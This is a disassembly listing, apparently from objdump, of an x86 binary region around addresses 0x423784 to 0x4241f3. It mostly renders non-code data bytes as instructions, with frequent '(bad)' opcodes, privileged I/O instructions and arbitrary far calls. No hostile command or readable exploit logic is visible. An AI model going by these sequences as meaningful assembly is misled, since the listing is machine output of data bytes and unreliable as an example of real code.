  423784:	cmp    esp,DWORD PTR [ebx-0x59181024]
  42378a:	pop    ecx
  42378c:	in     eax,0xcf
  42378e:	xchg   edx,eax
  42378f:	call   0x0:0x0
	...
  4237f2:	add    BYTE PTR [eax],al
  4237f4:	xor    al,0x23
  4237f6:	jo     0x423795
  4237f8:	ja     0x4237d9
  4237fa:	std    
  4237fb:	stos   DWORD PTR es:[edi],eax
  4237fc:	(bad)  
  4237fd:	sbb    edx,esi
  4237ff:	jmp    0x7a74:0x29ad51c5
  423806:	add    DWORD PTR [eax],eax
  423808:	add    al,0x1
  42380a:	add    BYTE PTR [eax],al
  42380c:	jle    0x42379f
  42380e:	mov    bh,0xaf
  423810:	jb     0x42381d
  423812:	(bad)  [esi]
  423814:	ins    BYTE PTR es:[edi],dx
  423815:	sub    al,0xbc
  423817:	mov    ds:0xf16fb6c2,al
  42381c:	push   ebp
  42381d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42381e:	addr16 sbb al,0xbc
  423821:	daa    
  423822:	jo     0x423824
  423824:	jecxz  0x4237c7
  423826:	xchg   edx,eax
  423827:	add    eax,0xa35114b4
  42382c:	fs dec ecx
  42382e:	xlat   BYTE PTR ds:[ebx]
  42382f:	xchg   BYTE PTR [edx+esi*1+0x5b],ah
  423833:	mov    esp,0xc8d43c1c
  423838:	push   esi
  423839:	stos   DWORD PTR es:[edi],eax
  42383a:	jbe    0x423846
  42383c:	retf   
  42383d:	sbb    ebx,edx
  42383f:	xchg   BYTE PTR [edi-0x7b],ch
  423842:	cs inc esp
  423844:	push   esi
  423845:	test   edx,0x881f219d
  42384b:	pop    edx
  42384c:	jl     0x42387b
  42384e:	mov    dl,0xac
  423850:	(bad)  
  423851:	cs pop edx
  423853:	data16 add ah,BYTE PTR [edx-0x47]
  423857:	inc    esi
  423858:	adc    al,0xdc
  42385a:	js     0x423878
  42385c:	jnp    0x4237fb
  42385e:	sbb    dl,BYTE PTR ds:0xf99c1b8a
  423864:	dec    esp
  423865:	adc    al,0x90
  423868:	ins    DWORD PTR es:[edi],dx
  423869:	jle    0x4238e4
  42386b:	lahf   
  42386c:	ret    0xb450
  42386f:	xor    al,BYTE PTR [edi]
  423871:	das    
  423872:	dec    edi
  423873:	call   0x352:0x7b296661
  42387a:	popa   
  42387b:	shl    BYTE PTR [edi-0x52],0xc8
  42387f:	sub    DWORD PTR [eax],0xe2e9846
  423885:	fwait
  423886:	or     ch,BYTE PTR [esi-0x5b]
  423889:	dec    ebx
  42388a:	push   edx
  42388b:	xchg   ebx,eax
  42388c:	xchg   esp,eax
  42388d:	dec    ecx
  42388e:	cs jge 0x423871
  423891:	adc    BYTE PTR [edi],bh
  423893:	shr    DWORD PTR [ebx-0x473155b7],1
  423899:	popf   
  42389a:	mov    edi,0xd2ec9748
  42389f:	mov    ds:0xd165cc76,eax
  4238a4:	mov    BYTE PTR [edi+edx*2],0x9e
  4238a8:	cwde   
  4238a9:	ins    BYTE PTR es:[edi],dx
  4238aa:	dec    eax
  4238ab:	inc    WORD PTR [ebp+0x59b21823]
  4238b2:	loopne 0x423845
  4238b4:	dec    ecx
  4238b5:	pop    ds
  4238b6:	jp     0x423932
  4238b8:	dec    ebp
  4238b9:	int3   
  4238ba:	je     0x423900
  4238bc:	js     0x42390c
  4238be:	call   0xdf23:0xbd0a8259
  4238c5:	push   cs
  4238c6:	lds    edx,FWORD PTR [esi+0x79]
  4238c9:	xor    BYTE PTR [ecx-0x3a],dl
  4238cc:	loopne 0x423908
  4238ce:	xchg   eax,edx
  4238d0:	enter  0x24f9,0x10
  4238d4:	fld    TBYTE PTR [esi+0x18]
  4238d7:	jns    0x42390b
  4238d9:	push   ds
  4238da:	jno    0x4238f7
  4238dc:	call   0x6c2b:0x9132df7e
  4238e3:	jp     0x423914
  4238e5:	xor    edx,ebp
  4238e7:	push   es
  4238e8:	jb     0x423928
  4238ea:	xor    DWORD PTR [edi],esi
  4238ec:	sbb    BYTE PTR [edi-0x2d7a913b],al
  4238f2:	lahf   
  4238f3:	jno    0x4238f8
  4238f5:	cwde   
  4238f6:	xor    eax,0x1fa548b9
  4238fb:	dec    ebp
  4238fc:	dec    ecx
  4238fd:	pop    ss
  4238fe:	jp     0x423922
  423900:	mov    DWORD PTR [esi+0xf94b469],edi
  423906:	xor    esp,DWORD PTR [edi-0x77112d4f]
  42390c:	pop    eax
  42390d:	stc    
  42390e:	sub    cl,BYTE PTR [ecx]
	...
  423974:	mov    ah,BYTE PTR [ecx+esi*8-0x4220078]
  42397b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42397c:	push   ecx
  42397d:	sbb    eax,0xa4f32bbd
  423982:	inc    eax
  423983:	xchg   esp,eax
  423984:	js     0x423a01
  423986:	add    DWORD PTR [eax],eax
  423988:	add    al,0x1
  42398a:	add    BYTE PTR [eax],al
  42398c:	aaa    
  42398d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42398e:	add    DWORD PTR [ecx+0x7110ca03],edx
  423994:	ja     0x4239e7
  423996:	mov    al,0x73
  423998:	fstp   st(1)
  42399a:	cs daa 
  42399c:	(bad)  
  42399d:	jns    0x4239cb
  42399f:	xlat   BYTE PTR ds:[ebx]
  4239a0:	mov    ah,0xf5
  4239a2:	call   0xe69f589f
  4239a7:	add    bl,BYTE PTR [eax+0x29]
  4239aa:	add    DWORD PTR [ebx-0x10ff1826],edx
  4239b0:	test   ebp,ecx
  4239b2:	imul   ebp,DWORD PTR [eax+0x74],0xa0308cf2
  4239b9:	adc    eax,0x5fd8ec41
  4239be:	push   edi
  4239bf:	jp     0x423a3f
  4239c1:	xchg   edi,eax
  4239c2:	dec    eax
  4239c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239c4:	mov    ds:0x74c4f4e5,eax
  4239c9:	jle    0x423a3c
  4239cb:	test   DWORD PTR [ecx+0x3d],ebx
  4239ce:	jmp    0x4239fb
  4239d0:	cmp    ah,dh
  4239d2:	test   DWORD PTR [esp+eiz*4-0x6366107],0x5a5767da
  4239dd:	jns    0x423a07
  4239df:	jns    0x423974
  4239e1:	pop    ecx
  4239e2:	push   ss
  4239e3:	cmp    esp,DWORD PTR [edx]
  4239e5:	arpl   WORD PTR [ebx-0x5cc4b1b6],dx
  4239eb:	psllq  mm5,mm3
  4239ee:	mov    DWORD PTR [edi],ecx
  4239f0:	xor    bh,BYTE PTR ds:0x3d5ca682
  4239f6:	(bad)  [edx+0x6f01c000]
  4239fc:	jno    0x423a41
  4239fe:	jno    0x4239cf
  423a00:	cmp    al,0x3e
  423a02:	fwait
  423a03:	test   eax,0xce974152
  423a08:	mov    edx,0x40a4abf7
  423a0d:	(bad)  
  423a0e:	mov    ecx,0x1495c4a3
  423a13:	xchg   ebp,eax
  423a14:	inc    ebx
  423a15:	je     0x423a06
  423a17:	addr16 gs mov bl,0x2c
  423a1b:	xchg   BYTE PTR [ebx-0x62],ah
  423a1e:	dec    edi
  423a1f:	inc    esp
  423a20:	mov    al,ds:0xacaa502a
  423a25:	and    edi,DWORD PTR [ebx-0x36a8910f]
  423a2b:	ret    0x994c
  423a2e:	dec    ebx
  423a2f:	xchg   DWORD PTR [edx],ebx
  423a31:	arpl   WORD PTR [ebx-0x186b91c5],ax
  423a37:	xor    ebx,DWORD PTR [ecx-0x72f3940a]
  423a3d:	push   esp
  423a3e:	pop    ecx
  423a3f:	add    al,0x77
  423a41:	sti    
  423a42:	int    0xeb
  423a44:	jne    0x4239e1
  423a46:	xor    eax,0x3d9a1f70
  423a4b:	and    al,0x15
  423a4d:	jge    0x423a6e
  423a4f:	jbe    0x423a4e
  423a51:	fisttp DWORD PTR [edi+0x5062b90f]
  423a57:	mov    ecx,esp
  423a59:	aam    0xc
  423a5b:	mov    ah,0xb8
  423a5d:	inc    esi
  423a5e:	dec    edi
  423a5f:	cld    
  423a60:	add    eax,0x45917b19
  423a65:	retf   0x54d4
  423a68:	inc    eax
  423a69:	jmp    0x423ab6
  423a6b:	add    edx,DWORD PTR [esi]
  423a6d:	popa   
  423a6e:	pop    esp
  423a6f:	pop    ds
  423a70:	add    ecx,DWORD PTR [ebp+0x7c]
  423a73:	stos   BYTE PTR es:[edi],al
  423a74:	cwde   
  423a75:	mov    esp,0xff56fd03
  423a7a:	and    al,0x50
  423a7c:	aas    
  423a7d:	stc    
  423a7e:	pop    edx
  423a7f:	clts   
  423a81:	cmp    al,0x88
  423a83:	aam    0x42
  423a85:	mov    esp,0x5da639bd
  423a8a:	cli    
  423a8b:	mov    esi,0x16072a9a
	...
  423af4:	xor    BYTE PTR ds:0xdf7d9f75,bh
  423afa:	cli    
  423afb:	mov    edi,0x60851ed8
  423b00:	bound  eax,QWORD PTR [edx+0x7c7c3216]
  423b06:	add    DWORD PTR [eax],eax
  423b08:	add    al,0x1
  423b0a:	add    BYTE PTR [eax],al
  423b0c:	js     0x423b81
  423b0e:	imul   esi,DWORD PTR [edx+0x1cb02082],0xffffffd2
  423b15:	push   edx
  423b16:	lods   eax,DWORD PTR ds:[esi]
  423b17:	add    edx,ecx
  423b19:	ins    BYTE PTR es:[edi],dx
  423b1a:	cmp    bl,dl
  423b1c:	push   ds
  423b1d:	stc    
  423b1e:	cwde   
  423b1f:	xchg   edx,eax
  423b20:	addr16 aam 0x91
  423b23:	pop    edi
  423b24:	xchg   ebp,eax
  423b25:	mul    BYTE PTR [eax+0x38]
  423b28:	popf   
  423b29:	out    0xf2,al
  423b2b:	scas   eax,DWORD PTR es:[edi]
  423b2c:	test   BYTE PTR [ebp+0x2f],ah
  423b2f:	ss stos BYTE PTR es:[edi],al
  423b31:	mov    eax,0x3291743a
  423b36:	cmc    
  423b37:	push   ebp
  423b38:	aas    
  423b39:	addr16 imul esp,ecx,0xffffffac
  423b3d:	pop    edx
  423b3e:	(bad)  
  423b3f:	in     al,0x14
  423b41:	mov    BYTE PTR [edx+0xfe31884],0xa1
  423b48:	jge    0x423b72
  423b4a:	repz xor dl,cl
  423b4d:	inc    esi
  423b4e:	add    DWORD PTR [esi],0x17959b2e
  423b54:	inc    esp
  423b55:	inc    edi
  423b56:	xchg   esp,eax
  423b57:	mov    esp,0xd4256e7
  423b5c:	jae    0x423b7b
  423b5e:	and    BYTE PTR [esp+ebx*8],al
  423b61:	loope  0x423b88
  423b63:	aaa    
  423b64:	repnz add ah,bh
  423b67:	ror    BYTE PTR [edi+0x11b8dea6],1
  423b6d:	push   ss
  423b6e:	xchg   edx,eax
  423b6f:	(bad)  
  423b70:	in     eax,dx
  423b71:	mov    eax,ds:0x86639800
  423b76:	stos   DWORD PTR es:[edi],eax
  423b77:	psubb  mm6,mm2
  423b7a:	inc    ebx
  423b7b:	xor    BYTE PTR [ecx-0x67],ah
  423b7e:	(bad)  
  423b7f:	shl    BYTE PTR ds:0x4dffbc5c,1
  423b85:	push   es
  423b86:	inc    esi
  423b87:	in     al,dx
  423b88:	sbb    ah,BYTE PTR [ecx+0x2082c19a]
  423b8e:	mov    bl,0x88
  423b90:	push   0x7fd2ff69
  423b95:	mov    WORD PTR [edi+0x1],fs
  423b98:	mov    dh,0x56
  423b9a:	pop    esp
  423b9b:	test   DWORD PTR [esi-0x2b5a16fc],0xd94f8fff
  423ba5:	neg    BYTE PTR [ecx+0x2508872]
  423bab:	hlt    
  423bac:	jb     0x423b65
  423bae:	lea    si,[ebx]
  423bb1:	ret    
  423bb2:	push   esi
  423bb3:	dec    edi
  423bb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423bb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423bb6:	pop    ds
  423bb7:	pop    ebp
  423bb8:	mov    ch,0x15
  423bba:	sbb    al,0x42
  423bbc:	mov    al,dl
  423bbe:	mov    eax,ds:0xad647d97
  423bc3:	and    eax,0x1cc8fe43
  423bc8:	adc    BYTE PTR fs:[eax+0x16],0x48
  423bcd:	test   BYTE PTR [eax+0x36a7b246],al
  423bd3:	add    eax,0x1a9728e
  423bd8:	mov    eax,ebx
  423bda:	ins    BYTE PTR es:[edi],dx
  423bdb:	xchg   BYTE PTR [edx+0x45],ah
  423bde:	pop    ebx
  423bdf:	push   ss
  423be0:	inc    esi
  423be1:	push   esi
  423be2:	mov    cl,0xf8
  423be4:	cli    
  423be5:	and    al,0x17
  423be7:	rcl    DWORD PTR [esi],cl
  423be9:	dec    dl
  423beb:	add    bh,0x6
  423bee:	inc    ebx
  423bef:	pop    es
  423bf0:	repnz xor DWORD PTR [esi-0x5d],0xffffff8f
  423bf5:	les    ebx,FWORD PTR [edx]
  423bf7:	test   eax,0x6e8d4b
  423bfc:	repz retf 
  423bfe:	dec    ecx
  423bff:	pop    ds
  423c00:	popa   
  423c01:	stc    
  423c02:	aam    0x19
  423c04:	sub    eax,0x1e56a079
  423c09:	add    eax,0xa39d13cb
  423c0e:	das    
  423c0f:	cwde   
	...
  423c74:	std    
  423c75:	(bad)  
  423c76:	test   eax,0xff57ab46
  423c7b:	call   FWORD PTR [eax+0x31446617]
  423c81:	push   edx
  423c82:	adc    BYTE PTR [eax+eax*4],ah
  423c85:	jge    0x423c88
  423c87:	add    BYTE PTR [ecx+eax*1],al
  423c8a:	add    BYTE PTR [eax],al
  423c8c:	je     0x423cb8
  423c8e:	add    al,0x19
  423c90:	(bad)  
  423c91:	mov    dh,0xe2
  423c93:	push   ebx
  423c94:	arpl   WORD PTR [esi+edx*2+0x23],ax
  423c98:	inc    edx
  423c99:	push   ecx
  423c9a:	mov    ebp,DWORD PTR [ecx-0x56ba851f]
  423ca0:	pushf  
  423ca1:	pop    ebp
  423ca2:	leave  
  423ca3:	mov    ebp,0x31712917
  423ca8:	xchg   ebp,eax
  423ca9:	pop    esp
  423caa:	sub    BYTE PTR [esp+edx*4],al
  423cad:	fisubr WORD PTR [edi-0x49c8633a]
  423cb3:	(bad)  
  423cb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423cb5:	pop    ss
  423cb6:	and    eax,0x71427953
  423cbb:	aaa    
  423cbc:	call   0xb99d:0x8c57a668
  423cc3:	mov    esi,0x1db415f4
  423cc8:	stos   DWORD PTR es:[edi],eax
  423cc9:	cmp    BYTE PTR [eax],cl
  423ccb:	fbstp  TBYTE PTR [edi]
  423ccd:	add    ah,BYTE PTR [ecx-0x4b]
  423cd0:	iret   
  423cd1:	adc    ebx,DWORD PTR [ecx+0x32]
  423cd4:	sub    al,0xb2
  423cd6:	jo     0x423cfb
  423cd8:	and    eax,0x8f4191db
  423cdd:	and    ebp,DWORD PTR [edx]
  423cdf:	add    DWORD PTR [edx],edx
  423ce1:	lds    ebx,FWORD PTR [esi+0x12]
  423ce4:	xchg   DWORD PTR [ecx+0x25cd366],ebp
  423cea:	cli    
  423ceb:	pop    esp
  423cec:	(bad)  
  423cee:	pusha  
  423cef:	dec    edi
  423cf0:	xchg   edi,eax
  423cf1:	inc    eax
  423cf2:	mov    BYTE PTR [edi+ebp*1+0x78],dl
  423cf6:	(bad)  
  423cf8:	sti    
  423cf9:	sub    cl,BYTE PTR [esi-0x74b01e95]
  423cff:	icebp  
  423d00:	in     eax,0x49
  423d02:	xor    bl,bh
  423d04:	in     al,0x0
  423d06:	push   ss
  423d07:	mov    edx,DWORD PTR [ebp+0x6b]
  423d0a:	adc    eax,0x63d7548b
  423d0f:	test   esp,edx
  423d11:	push   eax
  423d12:	cli    
  423d13:	inc    edi
  423d14:	jmp    0x423d13
  423d16:	mov    ebp,0xa3939ae1
  423d1b:	inc    esi
  423d1c:	jns    0x423d0e
  423d1e:	mov    cs,WORD PTR [ebp+0x5c]
  423d21:	enter  0x87f6,0x93
  423d25:	sbb    ebp,esp
  423d27:	push   ecx
  423d28:	pop    es
  423d29:	lock lahf 
  423d2b:	idiv   DWORD PTR [esi+0x4b]
  423d2e:	sbb    esi,esp
  423d30:	ja     0x423ce5
  423d32:	push   ebp
  423d33:	jg     0x423d57
  423d35:	out    dx,al
  423d36:	dec    edx
  423d37:	aad    0xd9
  423d39:	in     al,0xcd
  423d3b:	in     eax,0x3
  423d3d:	and    ah,BYTE PTR [ebx+0x17]
  423d40:	clc    
  423d41:	nop
  423d42:	test   DWORD PTR [esi-0xf732b53],ebp
  423d48:	dec    ecx
  423d49:	(bad)  
  423d4a:	cmp    BYTE PTR [ecx-0x19],ch
  423d4d:	daa    
  423d4e:	and    BYTE PTR [ebp+ecx*8-0x46],ah
  423d52:	jp     0x423d1c
  423d54:	mov    ecx,0x4930d7bf
  423d59:	xor    DWORD PTR [ebp+0x563f2495],ebp
  423d5f:	xchg   edx,eax
  423d60:	in     eax,0x2d
  423d62:	frstor [edi+0x3]
  423d65:	(bad)  
  423d66:	xor    DWORD PTR [esi+eax*8],esi
  423d69:	iret   
  423d6a:	test   BYTE PTR [ecx+0x22796557],ah
  423d70:	ss into 
  423d72:	push   0x3e
  423d74:	mov    cl,0x14
  423d76:	or     ebx,DWORD PTR [edx]
  423d78:	sub    ch,0x72
  423d7b:	mov    edx,edx
  423d7d:	dec    edx
  423d7e:	stos   BYTE PTR es:[edi],al
  423d7f:	fcom   st(6)
  423d81:	add    eax,0x5a488828
  423d86:	dec    edi
  423d87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423d88:	adc    DWORD PTR [edx-0x5a384119],edx
  423d8e:	and    BYTE PTR [ebx+0x0],0x0
	...
  423df1:	add    BYTE PTR [eax],al
  423df3:	add    BYTE PTR [edx-0xa],ah
  423df6:	xchg   DWORD PTR [ecx],ecx
  423df8:	xchg   edi,eax
  423df9:	jns    0x423de9
  423dfb:	jmp    DWORD PTR [edi]
  423dfd:	mov    DWORD PTR [eax+0x789c4bd2],esp
  423e03:	mov    dh,0x84
  423e05:	jle    0x423e08
  423e07:	add    BYTE PTR [ecx+eax*1],al
  423e0a:	add    BYTE PTR [eax],al
  423e0c:	mov    eax,ds:0xb10dad1d
  423e11:	add    al,0x5
  423e13:	xor    al,BYTE PTR [ebp-0x53d74b9c]
  423e19:	sub    ebp,edi
  423e1b:	test   BYTE PTR ds:0x8c9c178a,al
  423e21:	dec    DWORD PTR [edi]
  423e23:	push   ebx
  423e24:	inc    edi
  423e25:	mov    WORD PTR [ecx+0x47a5529d],ss
  423e2b:	in     al,dx
  423e2c:	inc    ebp
  423e2d:	sar    BYTE PTR [esi],cl
  423e2f:	mov    bh,0xc9
  423e31:	or     esi,esp
  423e33:	shr    BYTE PTR [edx+0x691310e],1
  423e39:	xchg   edi,eax
  423e3a:	add    ebp,DWORD PTR [edx+0xa]
  423e3d:	shr    DWORD PTR [ebp+0x17],cl
  423e40:	mov    eax,ds:0xd212300a
  423e45:	jno    0x423ec2
  423e47:	mov    ebx,0x67b980e4
  423e4c:	in     al,0xf7
  423e4e:	mov    ebp,0xbce96580
  423e53:	pop    esp
  423e54:	repnz test DWORD PTR [eax+edx*8],0xec8ee252
  423e5c:	jns    0x423e07
  423e5e:	scas   al,BYTE PTR es:[edi]
  423e5f:	or     al,0x6a
  423e61:	or     al,0xd1
  423e63:	sahf   
  423e64:	jp     0x423e73
  423e66:	mov    eax,cr6
  423e69:	pushf  
  423e6a:	add    DWORD PTR [ebp-0x51],edx
  423e6d:	and    al,0x70
  423e6f:	lods   al,BYTE PTR ds:[esi]
  423e70:	sbb    BYTE PTR [edi],cl
  423e72:	push   ecx
  423e73:	sub    al,0x1e
  423e75:	add    cl,BYTE PTR [ecx]
  423e77:	mov    bl,0x78
  423e79:	out    0x42,eax
  423e7b:	mov    al,0xe9
  423e7d:	xchg   ebx,eax
  423e7e:	addr16 jge 0x423e61
  423e81:	(bad)  
  423e82:	call   0x65943089
  423e87:	repz aad 0xda
  423e8a:	popf   
  423e8b:	pop    edi
  423e8c:	scas   al,BYTE PTR es:[edi]
  423e8d:	dec    esi
  423e8e:	sub    dh,BYTE PTR [edi]
  423e90:	jecxz  0x423e16
  423e92:	or     esp,DWORD PTR [edx]
  423e94:	jg     0x423e9e
  423e96:	dec    esi
  423e97:	popf   
  423e98:	mov    ah,0xa7
  423e9a:	scas   al,BYTE PTR es:[edi]
  423e9b:	mov    al,ds:0x57584800
  423ea0:	xlat   BYTE PTR ds:[ebx]
  423ea1:	add    al,0x1
  423ea3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423ea4:	outs   dx,DWORD PTR ds:[esi]
  423ea5:	cmp    al,0xe5
  423ea7:	push   ebp
  423ea8:	jne    0x423ecd
  423eaa:	fsub   st(4),st
  423eac:	fdivr  QWORD PTR [edi+0x23ef09f1]
  423eb2:	popf   
  423eb3:	or     ecx,DWORD PTR [edx+edi*8]
  423eb6:	pusha  
  423eb7:	test   al,0x19
  423eb9:	xor    al,BYTE PTR [eax+0x65]
  423ebc:	in     eax,dx
  423ebd:	mov    ecx,0xc298c5c2
  423ec2:	std    
  423ec3:	aam    0x20
  423ec5:	aad    0xe3
  423ec7:	enter  0xd39b,0x79
  423ecb:	fiadd  DWORD PTR [edx+0x520e03c2]
  423ed1:	in     eax,dx
  423ed2:	sbb    eax,0xfb7ddb31
  423ed7:	(bad)  
  423ed8:	or     bh,dl
  423eda:	mov    dh,0x95
  423edc:	(bad)  
  423edd:	jns    0x423f0f
  423edf:	sub    DWORD PTR [edi],edx
  423ee1:	mov    ds:0xfd09c756,eax
  423ee6:	mov    ecx,0xd064a3e
  423eeb:	jno    0x423f23
  423eed:	jno    0x423ec5
  423eef:	pop    ebp
  423ef0:	fwait
  423ef1:	mov    ebx,0x551fbfc3
  423ef6:	loope  0x423f5d
  423ef8:	pop    ds
  423ef9:	jbe    0x423f4a
  423efb:	lahf   
  423efc:	shl    esi,0xae
  423eff:	fs mov cr7,ecx
  423f03:	arpl   WORD PTR [esp-0x2fd83466],dx
  423f0a:	xchg   ebx,eax
  423f0b:	mov    ebx,0x8751cc0
	...
  423f74:	scas   al,BYTE PTR es:[edi]
  423f75:	call   0x9fff:0xff74b964
  423f7c:	adc    al,0x96
  423f7e:	sbb    al,0xd9
  423f80:	mov    eax,0x88968224
  423f85:	jg     0x423f88
  423f87:	add    BYTE PTR [ecx+eax*1],al
  423f8a:	add    BYTE PTR [eax],al
  423f8c:	jo     0x423f62
  423f8e:	mov    BYTE PTR [eax-0x4b],bl
  423f91:	popf   
  423f92:	les    ecx,FWORD PTR [ebp+0x6c8fe9cf]
  423f98:	cs sbb ch,ah
  423f9b:	(bad)  
  423f9c:	call   0x29fb0066
  423fa1:	add    DWORD PTR [ecx-0x6ed563c0],ebp
  423fa7:	or     BYTE PTR [ebx-0x5a],dh
  423faa:	pop    ebx
  423fab:	pushf  
  423fac:	sub    ebx,ebx
  423fae:	inc    eax
  423faf:	cmp    ebp,edx
  423fb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423fb2:	inc    edi
  423fb3:	fild   DWORD PTR [esp+ebx*4-0x4bfcfb97]
  423fba:	ss mov eax,0x4f96d7a6
  423fc0:	inc    esp
  423fc1:	jmp    0x6519be77
  423fc6:	js     0x423f96
  423fc8:	retf   
  423fc9:	inc    esi
  423fca:	pop    ecx
  423fcb:	or     ebx,edi
  423fcd:	and    eax,0xb7bc4def
  423fd2:	xor    edx,ebp
  423fd4:	mov    al,ds:0xadd7fc80
  423fd9:	jecxz  0x424002
  423fdb:	cmp    eax,0xca4c3da1
  423fe0:	mov    bh,0xb6
  423fe2:	aam    0x52
  423fe4:	adc    esi,DWORD PTR [edx+esi*4-0x226d43f9]
  423feb:	loop   0x423fc6
  423fed:	jnp    0x423fd1
  423fef:	sar    BYTE PTR [esi+0x72486136],0x68
  423ff6:	sbb    BYTE PTR [edi+0x259096ba],dh
  423ffc:	(bad)  
  423ffe:	and    eax,DWORD PTR [ebx]
  424000:	ja     0x42403f
  424002:	nop
  424003:	mov    bh,0x95
  424005:	loopne 0x423fe8
  424007:	mov    eax,0x491a3d84
  42400c:	pop    ecx
  42400d:	inc    edx
  42400e:	in     al,dx
  42400f:	aad    0xb9
  424011:	cli    
  424012:	int    0x50
  424014:	loop   0x423fb5
  424016:	out    0x4b,eax
  424018:	sbb    al,0x8
  42401a:	daa    
  42401b:	sbb    al,0xc5
  42401d:	addr16 sar ecx,0x8d
  424021:	popf   
  424022:	jae    0x423ff7
  424024:	cmp    eax,0xdb78655
  424029:	inc    edi
  42402a:	cmp    al,0x60
  42402c:	jecxz  0x423fb8
  42402e:	adc    bh,BYTE PTR [ebx+0x1c]
  424031:	pusha  
  424032:	pop    ds
  424033:	or     bl,BYTE PTR [ebp+0x7bcf576b]
  424039:	ret    
  42403a:	push   ecx
  42403b:	adc    DWORD PTR [esp+ebp*4],0x76
  42403f:	xor    BYTE PTR [edi-0x1e],dl
  424042:	adc    eax,0x5130b715
  424047:	mov    cl,dl
  424049:	push   eax
  42404a:	inc    edx
  42404b:	loop   0x424026
  42404d:	push   0x67
  42404f:	xchg   edx,eax
  424050:	lea    edx,[ecx-0x79]
  424053:	je     0x424052
  424055:	mov    dl,0xd5
  424057:	cs das 
  424059:	nop
  42405a:	addr16 (bad) 
  42405c:	lds    ebx,FWORD PTR [eax-0x2e]
  42405f:	outs   dx,BYTE PTR ds:[esi]
  424060:	xor    bl,BYTE PTR [ecx+0x43]
  424063:	jmp    0x424026
  424065:	pop    esi
  424066:	test   BYTE PTR [ebx],dl
  424068:	add    esi,DWORD PTR [edx]
  42406a:	cmp    bl,ch
  42406c:	xor    DWORD PTR [esi-0x65719c32],edx
  424072:	cdq    
  424073:	or     eax,0xac5ca2c3
  424078:	out    dx,al
  424079:	mov    bh,dl
  42407b:	stc    
  42407c:	pop    esi
  42407d:	mov    BYTE PTR [ebp+edi*8-0x50842f1a],bh
  424084:	cli    
  424085:	pop    edx
  424086:	(bad)  
  424087:	int    0x57
  424089:	xor    DWORD PTR [esi+edx*4],0xb8485423
	...
  4240f4:	jl     0x42414e
  4240f6:	cs mov cl,0x2e
  4240f9:	idiv   edi
  4240fb:	(bad)  
  4240fd:	jne    0x4240c6
  4240ff:	iret   
  424100:	ret    0xfccd
  424103:	xchg   DWORD PTR [eax+eax*4+0x1040001],ecx
  42410a:	add    BYTE PTR [eax],al
  42410c:	adc    ah,0x59
  42410f:	leave  
  424110:	adc    eax,0xef18cb0b
  424115:	out    dx,eax
  424116:	arpl   WORD PTR [ebp-0x51a05551],si
  42411c:	sbb    dh,BYTE PTR [ebx]
  42411e:	inc    eax
  42411f:	mov    bh,0xd9
  424121:	das    
  424122:	sbb    DWORD PTR [ecx+0x35ead5d5],eax
  424128:	leave  
  424129:	sar    BYTE PTR [ebx+0x73c4b0ce],1
  42412f:	adc    eax,0x4594b1ec
  424134:	xor    DWORD PTR [edi+0x10f8585b],edx
  42413a:	jg     0x424125
  42413c:	mov    DWORD PTR [edx+0x79b34086],edx
  424142:	pop    ecx
  424143:	mov    ax,0x10d2
  424147:	adc    al,0x49
  424149:	push   ebx
  42414a:	pusha  
  42414b:	repz lock fiadd DWORD PTR [edi-0x28]
  424150:	and    BYTE PTR [ecx+0x43],dl
  424153:	mov    WORD PTR [ebx],ss
  424155:	data16 (bad) 
  424157:	popf   
  424158:	xchg   esp,eax
  424159:	xchg   edi,eax
  42415a:	sbb    BYTE PTR [esi],bl
  42415c:	sub    ecx,DWORD PTR [eax-0x15]
  42415f:	sti    
  424160:	or     al,0x84
  424162:	iret   
  424163:	out    dx,al
  424164:	test   al,0x2c
  424166:	repz add ebp,DWORD PTR [ebp-0x12]
  42416a:	shl    BYTE PTR [eax-0x603dbf66],1
  424170:	dec    ebx
  424171:	inc    esi
  424172:	xor    esi,esp
  424174:	dec    ebx
  424175:	cmp    DWORD PTR [ebp-0x661fec9f],eax
  42417b:	shr    BYTE PTR [eax-0x560b71a],cl
  424181:	fimul  DWORD PTR [edi-0x1e]
  424184:	add    eax,0xacdebaf8
  424189:	aas    
  42418a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42418b:	cmp    al,0xc
  42418d:	test   al,0x99
  42418f:	inc    eax
  424190:	pop    edi
  424191:	imul   ebx,DWORD PTR [edi-0x7af5669a],0x28
  424198:	push   es
  424199:	les    ebp,FWORD PTR [edi]
  42419b:	stc    
  42419c:	jo     0x424190
  42419e:	xlat   BYTE PTR ds:[ebx]
  42419f:	rcr    cl,cl
  4241a1:	icebp  
  4241a2:	pop    ds
  4241a3:	(bad)  
  4241a4:	mov    es,WORD PTR [ecx]
  4241a6:	jns    0x4241a5
  4241a8:	push   eax
  4241a9:	pop    es
  4241aa:	push   ebp
  4241ab:	das    
  4241ac:	test   ch,dh
  4241ae:	lahf   
  4241af:	jge    0x424197
  4241b1:	mov    ebx,0xb684892
  4241b6:	sub    eax,0x67da336d
  4241bb:	adc    bh,dh
  4241bd:	data16 fisttp WORD PTR [esi]
  4241c0:	mov    edx,0xa7999bc0
  4241c5:	jge    0x424202
  4241c7:	pop    esp
  4241c8:	xchg   ch,bh
  4241ca:	ret    0x54cc
  4241cd:	push   ebx
  4241ce:	sahf   
  4241cf:	ret    
  4241d0:	sbb    ecx,DWORD PTR [edx]
  4241d2:	pop    ds
  4241d3:	push   ds
  4241d4:	or     DWORD PTR [edi],ebx
  4241d6:	xchg   edx,eax
  4241d7:	dec    edx
  4241d8:	sbb    DWORD PTR [ebx+0x684dcc08],eax
  4241de:	pop    ecx
  4241df:	inc    esi
  4241e0:	rol    edi,0x9a
  4241e3:	sbb    BYTE PTR [ecx+0x6],0xf5
  4241e7:	dec    ebp
  4241e8:	xchg   edi,eax
  4241e9:	cmp    ah,BYTE PTR [bx+di]
  4241ec:	stos   BYTE PTR es:[edi],al
  4241ed:	inc    edi
  4241ee:	mov    edi,0x5843def
  4241f3:	mov    DWORD PTR [eax+0x7f9a3ba7],esi
